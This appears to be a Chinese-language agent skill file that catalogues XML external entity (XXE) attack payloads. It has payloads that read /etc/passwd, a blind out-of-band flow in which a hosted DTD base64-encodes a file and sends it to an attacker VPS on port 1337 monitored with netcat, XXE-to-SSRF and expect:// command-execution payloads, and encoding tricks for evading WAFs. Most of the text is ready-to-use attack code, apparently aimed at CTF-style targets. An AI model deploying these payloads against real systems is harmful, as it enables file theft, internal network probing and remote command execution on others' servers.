---
name: xxe
description: Use when encountering xxe漏洞利用和文件读取技术
---

# XML外部实体注入

## Info

- **Domain**: web
- **Tags**: web, xxe, xml

# XXE实体注入

## 1. 基础XXE攻击

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## 2. 盲注XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>
```

## 3. OOB外带攻击

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "ftp://attacker.com/xxe">
%xxe;
]>
```

## 4. 文件读取

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

## 5. XXE+SSRF组合

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://internal-server/secret">
]>
<foo>&xxe;</foo>
```

## 6. 外部DTD利用

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo>&xxe;</foo>
```

## 7. 文件类型XXE

### XLSX文件XXE

解压xlsx文件，修改xl/workbook.xml添加XXE payload

### DOCX文件XXE

解压docx文件，修改word/document.xml添加XXE payload

## 8. XXE to RCE

### 通过PHP expect协议

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://whoami">
]>
<foo>&xxe;</foo>
```

**注意**: PHP需要安装expect扩展(默认未安装), 较难利用

---

## 9. DTD详解

### 内部DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE note [
<!ELEMENT note (to, from, message)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT message (#PCDATA)>
]>
<note><to>Alice</to><from>Bob</from><message>Hello!</message></note>
```

### 外部DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note><to>Alice</to></note>
```
外部note.dtd: `<!ELEMENT note (to, from, message)>`

### 内外部结合
```xml
<!DOCTYPE 根元素 SYSTEM "DTD文件路径" [定义内容]>
```

---

## 10. 盲注XXE完整流程

### 第1步: 目标服务器POST XML
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://VPS_IP:8000/test.dtd">
%remote;
%int;
%send;
]>
```

### 第2步: VPS上的test.dtd
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://VPS_IP:1337/?data=%file;'>">
```

### 第3步: VPS监听
```bash
nc -lvnp 1337
```

**原理**: %remote加载外部DTD → %int定义嵌套实体 → %send将文件内容外带到VPS

---

## 11. XXE触发SSRF

```xml
<?xml version="1.0" ?>
<!DOCTYPE ANY [
<!ENTITY % ssrf SYSTEM "http://内网IP:端口">
%ssrf;
]>
```

---

## 12. 编码绕过

XML支持多种编码, 可用于绕过WAF检测:

```
UTF-8   (默认)
UTF-16  (BE/LE两个变体)
UTF-32  (BE/LE/2143/3412四个变体)
EBCDIC
```

利用不同编码方式可以绕过基于特征检测的WAF。